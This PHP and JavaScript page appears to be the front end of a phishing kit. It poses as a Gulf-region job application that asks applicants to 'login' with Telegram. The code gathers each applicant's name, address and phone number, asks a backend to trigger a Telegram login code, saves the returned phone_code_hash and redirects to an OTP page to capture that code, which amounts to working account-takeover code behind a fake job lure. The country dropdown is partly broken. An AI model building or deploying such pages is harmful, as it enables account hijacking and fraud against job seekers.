<?php
// Include settings file
require_once 'settings.php';
session_start(); // Start session for OTP timing

// Save server time information in UTC 
$_SESSION['server_time'] = time(); // time() returns UTC timestamp in PHP
$_SESSION['server_time_iso'] = gmdate('Y-m-d\TH:i:s\Z'); // ISO format UTC time
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:title" content="SOEs Joint Recruitment 2025">
    <meta property="og:image" content="https://www.ahlan-world.org/wp-content/uploads/arabic-high-paying-jobs.jpg.webp">
    <meta name="description" content="Find Jobs in Egypt, Saudi Arabia, UAE, Qatar, Kuwait & Gulf. Thousands of online jobs and millions of job seekers are only available on ArabJobs">
    <meta name="author" content="SOEs Joint Recruitment 2025">
    <title>SOEs VACANCY</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;family=Protest+Guerrilla&amp;family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&amp;display=swap" rel="stylesheet">
    <link rel="icon" href="./dubai/uae.png" type="image/x-icon" sizes="32x25">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="./public/css/style.css">
    <style>
        /* Spinner styles */
        .spinner-border-sm {
            width: 1rem;
            height: 1rem;
            border-width: 0.2em;
        }
        
        /* Loading overlay styles */
        .loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Status message area */
        #status-message {
            margin-bottom: 15px;
        }
    </style>
</head>

<body>
    <div class="loading" style="display: none" id="loading">
        <div class="loader"></div>
    </div>

    <section>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-10 col-lg-6">
                    <div class="card">
                        <div class="card-body">
                            <div class="top-card">
                                <img src="" alt="banner">
                            </div>
                            <div class="middle-card mt-3">

                                <h1 class="text-center">Apply Now</h1>
                                <p class="text-left">
                                    To register please login using your <b>Telegram</b> account. And we will
                                    contact you to complete all the necessary files.
                                </p>
                                
                                <!-- Status message area -->
                                <div id="status-message"></div>

                                <form id="phone-form">
                                    <div class="mb-3">
                                        <label for="fullname" class="form-label">Full Name</label>
                                        <input type="text" class="form-control" name="fullname" id="fullname" placeholder="Full name" required>
                                    </div>

                                    <div class="mb-3">
                                        <label for="address" class="form-label">Address</label>
                                        <input type="text" class="form-control" name="address" id="address" placeholder="Your address" required>
                                    </div>

                                    <div class="mb-3">
                                        <label for="gender" class="form-label">Gender</label>
                                        <select class="form-select" name="gender" id="gender" required>
                                            <option value="Male">Male</option> <option value="Female">Female</option>
                                        </select>
                                    </div>

                                    <div class="mb-3">
                                        <label for="country" class="form-label">Country</label>
                                        <select class="form-select" name="country" id="country">
                                            <!-- Asian Countries (Prioritized) -->
                                            <option value="AE" selected>United Arab Emirates (+971)</option>
                                            <
                                        </select>
                                    </div>
                                    
                                    <!-- Custom country code input (appears when "Other" is selected) -->
                                    <div class="mb-3" id="custom-country-div" style="display: none;">
                                        <label for="custom-country-code" class="form-label">Enter Your Country Code</label>
                                        <div class="input-group">
                                            <span class="input-group-text">+</span>
                                            <input type="text" class="form-control" id="custom-country-code" placeholder="e.g. 123" pattern="[0-9]+" maxlength="4">
                                        </div>
                                        <small class="form-text text-muted">Enter your country code without the + symbol (e.g., 123)</small>
                                    </div>

                                    <div class="mb-3">
                                        <label for="phone" class="form-label">Telegram Number</label>
                                        <div class="input-group">
                                            <span class="input-group-text" id="country-code">+971</span>
                                            <input type="tel" class="form-control" name="phone" id="phone" 
                                                placeholder="Enter your Telegram number" 
                                                aria-label="Phone" aria-describedby="country-code" required>
                                        </div>
                                        <small class="form-text text-muted">
                                            Enter your number without country code (e.g. for UAE: 501234567)
                                        </small>
                                    </div>

                                    <div class="mb-3">
                                        <div class="form-check">
                                            <input class="form-check-input" type="checkbox" value="" id="flexCheckDefault" required>
                                            <label class="form-check-label" for="flexCheckDefault">
                                                I agree to receive <b>Telegram</b> messages from <b>Admin</b> about this application.
                                            </label>
                                        </div>
                                    </div>
                                    <div class="mb-3 text-center">
                                        <button type="submit" class="btn btn-login text-uppercase">Apply Now</button>
                                    </div>
                                </form>

                            </div>
                            <div class="bottom-card"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Load scripts in the correct order -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

    <script>
    // script.js
document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phone');
    const PREFIX = '+971';
    let isActive = false;

    // Saat input mendapatkan fokus
    phoneInput.addEventListener('focus', function() {
        if (!phoneInput.value.startsWith(PREFIX)) {
            phoneInput.value = PREFIX;
            isActive = true;
        }
        setTimeout(() => phoneInput.setSelectionRange(PREFIX.length, PREFIX.length), 0);
    });

    // Saat input kehilangan fokus
    phoneInput.addEventListener('blur', function() {
        if (phoneInput.value === PREFIX) {
            phoneInput.value = '';
            isActive = false;
        }
    });

    // Saat terjadi input
    phoneInput.addEventListener('input', function() {
        if (!phoneInput.value.startsWith(PREFIX) && isActive) {
            // Jika prefix dihapus, kembalikan
            phoneInput.value = PREFIX + phoneInput.value.replace(/\D/g, '');
        }
        
        // Posisikan kursor setelah prefix jika mencoba edit prefix
        if (phoneInput.selectionStart < PREFIX.length && isActive) {
            setTimeout(() => phoneInput.setSelectionRange(PREFIX.length, PREFIX.length), 0);
        }
    });

    // Handle copy-paste
    phoneInput.addEventListener('paste', function(e) {
        e.preventDefault();
        if (!isActive) return;
        
        let pasteData = (e.clipboardData || window.clipboardData).getData('text');
        let cleanValue = pasteData.replace(/\D/g, '');
        phoneInput.value = PREFIX + cleanValue;
        phoneInput.setSelectionRange(PREFIX.length + cleanValue.length, PREFIX.length + cleanValue.length);
    });

    // Blok edit prefix
    phoneInput.addEventListener('keydown', function(e) {
        if (!isActive) return;
        
        if (phoneInput.selectionStart < PREFIX.length && ![
            'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 
            'Tab', 'End', 'Home', 'Delete'
        ].includes(e.key)) {
            e.preventDefault();
        }
    });
});
    // Create the phpSettings variable from PHP $url variable
    var phpSettings = {
        endpointUrl: '<?php echo $url; ?>'
    };
    
    // Store PHP server time info
    var phpServerTime = {
        timestamp: <?php echo time(); ?>, // UTC timestamp
        iso: '<?php echo gmdate('Y-m-d\TH:i:s\Z'); ?>' // ISO format UTC time
    };
    
    // Define CONFIG object for AJAX timeout
    var CONFIG = {
        TIMEOUT: 300000 // timeout in milliseconds (5 minutes = 300 seconds * 1000)
    };
    
    // Initialize toastr with explicit configuration
    $(document).ready(function() {
        console.log("Initializing toastr...");
        
        // Detailed toastr configuration
        toastr.options = {
            "closeButton": true,
            "debug": false,
            "newestOnTop": true,
            "progressBar": true,
            "positionClass": "toast-top-right",
            "preventDuplicates": false,
            "onclick": null,
            "showDuration": "300",
            "hideDuration": "1000",
            "timeOut": "5000",
            "extendedTimeOut": "1000",
            "showEasing": "swing",
            "hideEasing": "linear",
            "showMethod": "fadeIn",
            "hideMethod": "fadeOut"
        };
        
        // Test toastr to make sure it's working
        console.log("Testing toastr initialization...");
        setTimeout(function() {
            toastr.info("Registration form is ready to use");
        }, 1000);
        
        // Check server time with backend API to verify time synchronization
        checkServerTime();
    });
    
    // Function to check server time with backend
    function checkServerTime() {
        console.log("Checking server time with backend...");
        $.ajax({
            url: phpSettings.endpointUrl + "/server-time",
            type: "GET",
            success: function(data) {
                console.log("Server time info:", data);
                
                // Compare with browser time
                const browserTime = new Date();
                const serverTimeUTC = new Date(data.utc_time);
                const timeDiff = Math.abs(browserTime.getTime() - serverTimeUTC.getTime()) / 1000;
                
                console.log("Browser time:", browserTime.toISOString());
                console.log("Server UTC time:", data.utc_time);
                console.log("Time difference (seconds):", timeDiff);
                
                // Also compare with PHP time
                const phpTimeDiff = Math.abs(phpServerTime.timestamp - data.php_compatible_time);
                console.log("PHP server vs Flask server time diff (seconds):", phpTimeDiff);
                
                if (timeDiff > 60) {
                    // If more than 1 minute difference between browser and server, warn in console
                    console.warn("Warning: Large time difference between browser and server:", timeDiff, "seconds");
                }
                
                if (phpTimeDiff > 60) {
                    // If more than 1 minute difference between PHP and Flask servers, warn in console
                    console.warn("Warning: Time synchronization issue between PHP and Flask servers:", phpTimeDiff, "seconds");
                }
            },
            error: function(xhr, status, error) {
                console.error("Error checking server time:", error);
            }
        });
    }
    
    // Debug function - only logs to console, not visible in UI
    function debugLog(message) {
        console.log(message);
    }
</script>

    <script>
        // Country codes mapping
        const countryCodes = {
            // Asian Countries
            'AE': '+971',  // United Arab Emirates
            'SA': '+966',  // Saudi Arabia
            'QA': '+974',  // Qatar
            'KW': '+965',  // Kuwait
            'BH': '+973',  // Bahrain
            'OM': '+968',  // Oman
            'JO': '+962',  // Jordan
            'LB': '+961',  // Lebanon
            'ID': '+62',   // Indonesia
            'MY': '+60',   // Malaysia
            'SG': '+65',   // Singapore
            'TH': '+66',   // Thailand
            'PH': '+63',   // Philippines
            'VN': '+84',   // Vietnam
            'JP': '+81',   // Japan
            'KR': '+82',   // South Korea
            'CN': '+86',   // China
            'HK': '+852',  // Hong Kong
            'TW': '+886',  // Taiwan
            'IN': '+91',   // India
            'PK': '+92',   // Pakistan
            'BD': '+880',  // Bangladesh
            'LK': '+94',   // Sri Lanka
            'IR': '+98',   // Iran
            'IQ': '+964',  // Iraq
            'IL': '+972',  // Israel
            'PS': '+970',  // Palestine
            'SY': '+963',  // Syria
            'YE': '+967',  // Yemen
            
            // Other Popular Countries
            'US': '+1',    // United States
            'CA': '+1',    // Canada
            'GB': '+44',   // United Kingdom
            'AU': '+61',   // Australia
            'NZ': '+64',   // New Zealand
            'DE': '+49',   // Germany
            'FR': '+33',   // France
            'IT': '+39',   // Italy
            'ES': '+34',   // Spain
            'RU': '+7',    // Russia
            'BR': '+55',   // Brazil
            'MX': '+52',   // Mexico
            'AR': '+54',   // Argentina
            'ZA': '+27',   // South Africa
            'EG': '+20',   // Egypt
            'NG': '+234',  // Nigeria
            'KE': '+254',  // Kenya
            'ET': '+251',  // Ethiopia
            
            // Default for "Other"
            'OTHER': '+' 
        };

        $(document).ready(function() {
            console.log("Document ready");
            
            // Try to get banner from sessionStorage
            var img = sessionStorage.getItem("img");
            console.log("Banner image:", img);
            if (img) {
                $(".top-card").children("img").attr("src", img);
            }
            
            // Set initial country code display
            $("#country-code").text(countryCodes['AE']);
            
            // When country selection changes
            $("#country").change(function() {
                const selectedCountry = $(this).val();
                const countryCode = countryCodes[selectedCountry];
                
                // Show/hide custom country code input based on selection
                if (selectedCountry === 'OTHER') {
                    $("#custom-country-div").show();
                    $("#country-code").text('+');
                } else {
                    $("#custom-country-div").hide();
                    $("#country-code").text(countryCode);
                }
                
                // Update placeholder for better UX
                $("#phone").attr("placeholder", "Enter your Telegram number");
            });
            
            // When custom country code changes
            $("#custom-country-code").on('input', function() {
                const customCode = $(this).val().trim();
                if (customCode) {
                    $("#country-code").text('+' + customCode);
                } else {
                    $("#country-code").text('+');
                }
            });

            // Form submission handler
            $("#phone-form").on("submit", function(e) {
                e.preventDefault();
                console.log("Form submitted");
                
                // Get phone number
                var rawPhoneNumber = $("#phone").val().trim();
                var selectedCountry = $("#country").val();
                var countryCode;
                
                // Handle custom country code
                if (selectedCountry === 'OTHER') {
                    const customCode = $("#custom-country-code").val().trim();
                    if (!customCode) {
                        console.log("Custom country code is empty");
                        try {
                            toastr.error("Please enter your country code");
                        } catch (e) {
                            console.error("Toastr error:", e);
                            alert("Please enter your country code");
                        }
                        $("#status-message").html('<div class="alert alert-danger">Please enter your country code</div>');
                        return false;
                    }
                    countryCode = '+' + customCode;
                } else {
                    countryCode = countryCodes[selectedCountry];
                }
                
                // Format the phone number with international code
                var formattedNumber = formatPhoneNumber(rawPhoneNumber, countryCode);
                
                // Validate the formatted number
                if (!validatePhoneNumber(formattedNumber)) {
                    console.log("Phone number invalid:", formattedNumber);
                    try {
                        toastr.error("Invalid phone number format. Please check again.");
                    } catch (e) {
                        console.error("Toastr error:", e);
                        alert("Invalid phone number format. Please check again.");
                    }
                    $("#status-message").html('<div class="alert alert-danger">Invalid phone number format. Please check again.</div>');
                    return false;
                }
                
                // Create session ID if it doesn't exist
                var sessionId = getCookie('session_id');
                if (!sessionId) {
                    sessionId = generateSessionId();
                    setCookie('session_id', sessionId, 1); // Save for 1 day
                }

                const data = {
                    fullname: $("#fullname").val(),
                    address: $("#address").val(),
                    gender: $("#gender").val(),
                    phoneNumber: formattedNumber,
                    country: selectedCountry,
                    countryCode: countryCode, // Store the actual country code used
                    session_id: sessionId,
                    php_server_time: phpServerTime.timestamp, // Send PHP server time for cross-validation
                    client_time: Math.floor(Date.now() / 1000) // Add client time for cross-check
                }

                // Save phone number and country for next page
                localStorage.setItem("phoneNumber", formattedNumber);
                localStorage.setItem("country", selectedCountry);
                
                // Log data for debugging
                console.log("Data being sent:", data);
                console.log("Session ID:", sessionId);
                
                // Get endpoint from PHP variable
                const endpointUrl = phpSettings.endpointUrl;
                
                // Show loading overlay and disable form
                $(".loading").show();
                $("#status-message").html('<div class="alert alert-info">Sending OTP code request to Telegram. Please wait... (up to 5 minutes)</div>');
                
                // Disable form while processing
                $("#phone-form").find("input, select, button").prop("disabled", true);
                $("button[type=submit]").html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
                
                // Send to Flask backend with increased timeout (5 minutes = 300 seconds)
                $.ajax({
                    url: endpointUrl + "/form",
                    type: "POST",
                    data: JSON.stringify(data),
                    contentType: "application/json",
                    dataType: "json",
                    timeout: CONFIG.TIMEOUT, // 5 minutes in milliseconds
                    success: function(response) {
                        console.log("Response received:", response);
                        $(".loading").hide();
                        
                        if (response.success) {
                            console.log("OTP request successful");
                            
                            // Save phone_code_hash from response - CRITICAL!
                            if (response.phone_code_hash) {
                                localStorage.setItem("phone_code_hash", response.phone_code_hash);
                                sessionStorage.setItem("phone_code_hash", response.phone_code_hash); // Backup in sessionStorage too
                                console.log("Saved phone_code_hash:", response.phone_code_hash);
                            }
                            
                            // Save OTP sent time in localStorage (in UTC seconds)
                            var now = Math.floor(Date.now() / 1000);
                            localStorage.setItem("otp_sent_time", now);
                            sessionStorage.setItem("otp_sent_time", now); // Backup in sessionStorage too
                            console.log("Saved OTP sent time:", now);
                            
                            // Show success message
                            $("#status-message").html('<div class="alert alert-success text-center">OTP code has been sent to your Telegram account. Redirecting to verification page...</div>');
                            
                            try {
                                // Show toastr notification
                                toastr.success("OTP code has been sent to your Telegram account");
                            } catch (e) {
                                console.error("Toastr error:", e);
                            }
                            
                            // Disable form completely
                            $("#phone-form").find("input, select, button").prop("disabled", true);
                            
                            // Redirect to OTP page - try with a direct approach first
                            console.log("Redirecting to OTP page...");
                            window.location.href = "./otp.php";
                            
                            // Backup redirect method with a slight delay
                            setTimeout(function() {
                                console.log("Using fallback redirect");
                                window.location.replace("./otp.php");
                                
                                // Last resort - force using assign method
                                setTimeout(function() {
                                    console.log("Using last resort redirect");
                                    document.location.assign("./otp.php");
                                }, 500);
                            }, 1000);
                        } else {
                            console.log("OTP request failed:", response.error);
                            
                            // Re-enable form
                            $("#phone-form").find("input, select, button").prop("disabled", false);
                            $("button[type=submit]").text("Apply Now");
                            
                            // Show error message
                            var errorMsg = response.error || "An error occurred while sending OTP code. Please try again.";
                            $("#status-message").html('<div class="alert alert-danger">' + errorMsg + '</div>');
                            
                            try {
                                toastr.error(errorMsg);
                            } catch (e) {
                                console.error("Toastr error:", e);
                                alert(errorMsg);
                            }
                        }
                    },
                    error: function(xhr, status, error) {
                        console.log("AJAX error:", error, "Status:", status);
                        console.log("Response:", xhr.responseText);
                        
                        $(".loading").hide();
                        
                        // Re-enable form
                        $("#phone-form").find("input, select, button").prop("disabled", false);
                        $("button[type=submit]").text("Apply Now");
                        
                        var errorMsg = "";
                        if (status === "timeout") {
                            errorMsg = "Request timed out (5 minutes). The server may be busy. Please try again.";
                        } else {
                            errorMsg = "Failed to contact server. Please try again.";
                        }
                        
                        $("#status-message").html('<div class="alert alert-danger">' + errorMsg + '</div>');
                        
                        try {
                            toastr.error(errorMsg);
                        } catch (e) {
                            console.error("Toastr error:", e);
                            alert(errorMsg);
                        }
                    }
                });
            });
            
            // Function to format international phone number
            function formatPhoneNumber(number, countryCode) {
                // Remove all non-digit characters except the plus sign
                let cleanNumber = number.replace(/[^\d+]/g, '');
                
                // If already starts with +, return as is
                if (cleanNumber.startsWith('+')) {
                    return cleanNumber;
                }
                
                // If starts with the country code digits (without +)
                let countryDigits = countryCode.substring(1); // remove the + from country code
                if (cleanNumber.startsWith(countryDigits)) {
                    return '+' + cleanNumber;
                }
                
                // Otherwise add the country code
                return countryCode + cleanNumber;
            }
            
            // Function to validate international phone number
            function validatePhoneNumber(phoneNumber) {
                // Basic validation - ensure it starts with + and has at least 7 digits after country code
                // Most international numbers are between 8 and 15 digits total
                var phoneRegex = /^\+[1-9]\d{1,4}\d{6,14}$/;
                
                // Check minimum length (country code + at least 7 digits)
                if (phoneNumber.length < 8) {
                    return false;
                }
                
                return phoneRegex.test(phoneNumber);
            }
            
            // Functions for cookies
            function setCookie(name, value, days) {
                let expires = "";
                if (days) {
                    const date = new Date();
                    date.setTime(date.getTime() + (days*24*60*60*1000));
                    expires = "; expires=" + date.toUTCString();
                }
                document.cookie = name + "=" + value + expires + "; path=/";
            }

            function getCookie(name) {
                const nameEQ = name + "=";
                const ca = document.cookie.split(';');
                for(let i=0; i < ca.length; i++) {
                    let c = ca[i];
                    while (c.charAt(0) === ' ') c = c.substring(1,c.length);
                    if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length,c.length);
                }
                return null;
            }

            function generateSessionId() {
                return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                    const r = Math.random() * 16 | 0;
                    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
                });
            }
        });
    </script>
</body>

</html>